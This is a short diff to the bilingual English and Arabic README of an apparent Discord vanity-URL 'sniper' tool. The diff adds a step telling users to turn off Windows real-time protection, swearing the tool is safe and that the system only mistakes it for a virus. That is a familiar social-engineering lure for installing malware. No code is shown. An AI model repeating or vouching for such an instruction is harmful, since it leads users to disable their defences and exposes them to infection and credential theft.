@@ -30,6 +30,7 @@ A tool to automatically check and snipe Discord vanity URLs.
 
 1. Open the tool and set your options. | شغل الأداة واضبط الإعدادات.
 2. Add your webhook to receive notifications. | أدخل رابط Webhook لاستقبال التنبيهات.
+3. Turn Off Real Protection , I Swear Its Safe. | طف حمايه الويندوز والله مافيها شي بس عشان التول نفسها يحسبها فايروس.
 4. Click “Start Checking” and wait. | اضغط بدء الفحص او التقنيص وانتظر الإشعارات.
 
 ---
